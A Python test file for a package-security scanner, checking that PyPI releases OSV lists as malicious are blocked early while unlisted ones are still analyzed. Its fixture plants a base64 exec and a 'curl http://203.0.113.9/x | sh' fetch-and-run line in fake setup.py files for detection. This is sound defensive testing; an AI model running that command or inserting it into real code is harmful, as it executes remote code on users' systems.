"""A release OSV lists as malicious is a BLOCK by definition, so its code is not analyzed and the ML model does not run
(run: python3 tests/test_osv_early_stop.py). Nothing is killed: the download, the analysis and the model check a stop
signal that the OSV lookup sets. Other packages, and releases OSV does not list, are analyzed as before."""
import sys
import tempfile
import threading
import time
from pathlib import Path

IMPL = Path(__file__).resolve().parents[1] / "guard"
sys.path.insert(0, str(IMPL))

import behavior  # noqa: E402
import collect  # noqa: E402
import post_rules as PR  # noqa: E402
import scan_engine as se  # noqa: E402
from review_report import package_record  # noqa: E402
from sources import pypi  # noqa: E402

BAD = "import base64, os\nexec(base64.b64decode('cHJpbnQoMSk='))\nos.system('curl http://203.0.113.9/x | sh')\n"
MAL = [{"id": "MAL-2025-0001", "summary": "Malicious code in evx (PyPI)"}]


def files_with(code: str) -> list[Path]:
    root = Path(tempfile.mkdtemp()) / "evx-1.0.unpacked" / "evx-1.0"
    (root / "evx").mkdir(parents=True)
    (root / "setup.py").write_text(code)
    (root / "evx" / "__init__.py").write_text(code)
    return list(root.rglob("*"))


# 1. static_analysis: a stop already set skips the rules and the behavior analysis
f = se.ScanFeatures(name="evx", version="1.0")
stop = threading.Event()
stop.set()
se.static_analysis(files_with(BAD), f, stop)
assert f.analysis_skipped == se.OSV_MALICIOUS_SKIP, f.analysis_skipped
assert not f.evidence and not getattr(f, "behavior_block", None), f.evidence

# 2. without a stop (or a stop never set) the same code is analyzed as before
f2 = se.ScanFeatures(name="evx", version="1.0")
se.static_analysis(files_with(BAD), f2, threading.Event())
assert f2.analysis_skipped is None and f2.evidence, "the analysis must run when OSV does not list the release"

# 3. the behavior analysis stops between files without inventing "not analyzed" findings
ctx = behavior.analyze_files(files_with(BAD), se.ScanFeatures(name="evx", version="1.0"), stop=stop)
assert not ctx.facts, ctx.facts
assert not any(k[0] == "not_analyzed" for k in ctx.facts), "a stop is not a coverage gap"

# 4. scan_package end to end, offline: OSV answers MAL while the download is still running
meta = {"info": {"name": "evx", "version": "1.0"},
        "releases": {"1.0": [{"packagetype": "sdist", "filename": "evx-1.0.tar.gz", "upload_time_iso_8601": "2020-01-01T00:00:00Z"}]}}
calls = {"ml": 0, "osv": 0}
saved = (pypi.metadata, pypi.fetch, collect.fetch_release, collect.fetch_requires, se.query_osv, se._ml_predict)


def fake_fetch(name, version, dest, art=None, meta=None):
    time.sleep(0.3)                                       # the archive arrives after OSV has answered
    return None, files_with(BAD)


def fake_ml(name, version, handoff=None):
    calls["ml"] += 1
    return {"ok": False, "error": "stub"}


def fake_osv(listed):
    def q(name, version, *a):
        calls["osv"] += 1
        return list(listed)
    return q


try:
    pypi.metadata = lambda n: meta
    pypi.fetch = fake_fetch
    collect.fetch_release = lambda *a, **k: {}
    collect.fetch_requires = lambda *a, **k: []
    se._ml_predict = fake_ml

    se.query_osv = fake_osv(MAL)
    v = se.scan_package("evx", "1.0")
    assert v.features.analysis_skipped == se.OSV_MALICIOUS_SKIP, v.features.analysis_skipped
    assert calls["ml"] == 0, "the model must not run for a release OSV lists as malicious"
    assert PR.apply(v, "1.0")[0] == "BLOCK"
    rec = package_record("evx", "1.0", v)
    assert any("OSV already lists" in n for n in rec["coverage"]["notes"]), rec["coverage"]

    # the same package, OSV listing nothing: analyzed, the model asked
    se.query_osv = fake_osv([])
    v2 = se.scan_package("evx", "1.0")
    assert v2.features.analysis_skipped is None and v2.features.evidence
    assert calls["ml"] == 1
    assert v2.verdict in ("BLOCK", "NEEDS_HUMAN_REVIEW"), v2.verdict
finally:
    pypi.metadata, pypi.fetch, collect.fetch_release, collect.fetch_requires, se.query_osv, se._ml_predict = saved

# 5. a malicious record still blocks when the OSV reachability probe timed out (it is OSV answering)
listed = se.ScanFeatures(name="evx", version="1.0", fetch_ok=True)
listed.osv_vulns = MAL
assert PR.apply(se.Verdict("ALLOW", 0.0, [], listed), "1.0", osv_ok=False)[0] == "BLOCK"
# ...and an empty lookup with the probe down is still "OSV unavailable", not a pass
empty = se.ScanFeatures(name="evx", version="1.0", fetch_ok=True)
assert PR.apply(se.Verdict("ALLOW", 0.0, [], empty), "1.0", osv_ok=False) == ("NEEDS_HUMAN_REVIEW", {"rule": "osv_unavailable"})

print("ok")
